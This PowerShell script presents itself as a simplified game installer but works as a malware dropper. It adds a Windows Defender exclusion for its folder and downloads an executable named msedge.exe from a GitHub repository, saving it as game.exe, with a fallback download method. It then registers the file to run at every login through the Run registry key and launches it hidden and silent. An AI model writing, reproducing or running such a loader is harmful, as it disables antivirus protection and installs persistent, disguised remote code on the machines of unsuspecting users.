# Simplified installer - focus on core functionality
$gameFolder = "$env:USERPROFILE\Documents\MyGame"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$gameFolder\game.exe"
$autoStartName = "MyGame"
$logPath = "$env:TEMP\game_install_log.txt"

# Create log function
function Write-Log {
    param($message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $message" | Out-File -FilePath $logPath -Append
}

Write-Log "Starting installation"

# Create folder
if (!(Test-Path -Path $gameFolder)) {
    try {
        New-Item -ItemType Directory -Path $gameFolder -Force | Out-Null
        Write-Log "Created folder: $gameFolder"
    } catch {
        Write-Log "Error creating folder: $_"
    }
} else {
    Write-Log "Folder already exists: $gameFolder"
}

# Try to add exclusion directly
try {
    Write-Log "Attempting to add exclusion"
    Add-MpPreference -ExclusionPath $gameFolder -ErrorAction Stop
    Write-Log "Added exclusion successfully"
} catch {
    Write-Log "Error adding exclusion: $_"
    
    # Try alternative method using Set-MpPreference
    try {
        $currentExclusions = (Get-MpPreference).ExclusionPath
        if ($currentExclusions -notcontains $gameFolder) {
            $newExclusions = $currentExclusions + $gameFolder
            Set-MpPreference -ExclusionPath $newExclusions
            Write-Log "Added exclusion using alternative method"
        }
    } catch {
        Write-Log "Alternative exclusion method failed: $_"
    }
}

# Download file with retry
$maxRetries = 3
$retryCount = 0
$downloadSuccess = $false

while (-not $downloadSuccess -and $retryCount -lt $maxRetries) {
    try {
        Write-Log "Download attempt $($retryCount+1): $downloadUrl"
        
        # Method 1: Invoke-WebRequest
        Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
        
        if (Test-Path $downloadPath) {
            $fileSize = (Get-Item $downloadPath).Length
            Write-Log "Download successful. File size: $fileSize bytes"
            $downloadSuccess = $true
        } else {
            Write-Log "Download appeared to succeed but file not found"
            $retryCount++
        }
    } catch {
        Write-Log "Download method 1 failed: $_"
        
        # Method 2: .NET WebClient
        try {
            Write-Log "Trying alternative download method"
            (New-Object Net.WebClient).DownloadFile($downloadUrl, $downloadPath)
            
            if (Test-Path $downloadPath) {
                $fileSize = (Get-Item $downloadPath).Length
                Write-Log "Alternative download successful. File size: $fileSize bytes"
                $downloadSuccess = $true
            } else {
                Write-Log "Alternative download appeared to succeed but file not found"
            }
        } catch {
            Write-Log "Download method 2 failed: $_"
        }
        
        $retryCount++
    }
    
    if (-not $downloadSuccess -and $retryCount -lt $maxRetries) {
        Write-Log "Waiting 2 seconds before retry"
        Start-Sleep -Seconds 2
    }
}

# Add to startup
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
    Write-Log "Added to startup programs"
} catch {
    Write-Log "Error adding to startup: $_"
}

# Launch if file exists
if (Test-Path $downloadPath) {
    try {
        Start-Process -FilePath $downloadPath -ArgumentList "/silent" -WindowStyle Hidden
        Write-Log "Launched application"
    } catch {
        Write-Log "Error launching application: $_"
    }
} else {
    Write-Log "Cannot launch - file does not exist: $downloadPath"
}

Write-Log "Installation process completed"
Write-Log "Log location: $logPath"